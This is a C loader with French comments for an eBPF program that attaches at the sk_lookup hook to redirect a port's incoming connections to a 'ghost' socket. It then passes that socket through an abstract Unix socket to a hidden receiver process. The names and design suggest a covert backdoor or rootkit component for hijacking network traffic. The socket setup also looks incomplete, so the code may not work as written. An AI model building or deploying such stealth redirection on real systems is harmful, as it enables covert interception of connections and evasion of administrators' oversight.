#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/in.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>

#define BPF_OBJ "ghost.bpf.o"

void send_fd(int fd_to_send) {
    int sock;
    struct sockaddr_un addr = { .sun_family = AF_UNIX };
    addr.sun_path[0] = '\0'; // Abstract socket
    strncpy(addr.sun_path + 1, "ghost_bridge", sizeof(addr.sun_path) - 2);

    sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Connect to receiver failed");
        return;
    }

    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    struct iovec io = { .iov_base = "SYNC", .iov_len = 4 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *((int *)CMSG_DATA(cmsg)) = fd_to_send;

    if (sendmsg(sock, &msg, 0) < 0) perror("sendmsg failed");
    close(sock);
}

int main() {
    struct bpf_object *obj;
    struct bpf_program *prog;
    int prog_fd, map_fd, ghost_sk;
    uint32_t key = 0;

    // 1. Charger l'objet sans exiger BTF
    DECLARE_LIBBPF_OPTS(bpf_object_open_opts, opts);
    obj = bpf_object__open_file(BPF_OBJ, &opts);
    if (!obj) return 1;

    if (bpf_object__load(obj)) {
        fprintf(stderr, "Erreur: Kernel trop vieux ou manque de privilèges BPF.\n");
        return 1;
    }

    prog = bpf_object__find_program_by_name(obj, "ghost_redir_port");
    prog_fd = bpf_program__fd(prog);
    map_fd = bpf_object__find_map_fd_by_name(obj, "ghost_sock_map");

    // 2. Socket fantôme
    ghost_sk = socket(AF_INET, SOCK_STREAM, 0);
    
    uint64_t sock_val = (uint64_t)ghost_sk;
    bpf_map_update_elem(map_fd, &key, &sock_val, BPF_ANY);

    // 3. Attachement (Nécessite CAP_NET_ADMIN)
    int netns_fd = open("/proc/self/ns/net", O_RDONLY);
    if (bpf_prog_attach(prog_fd, netns_fd, BPF_SK_LOOKUP, 0) < 0) {
        perror("Attach failed (CAP_NET_ADMIN requis)");
        return 1;
    }

    send_fd(ghost_sk);
    printf("[+] Fait. Socket transféré au receiver.\n");
    return 0;
}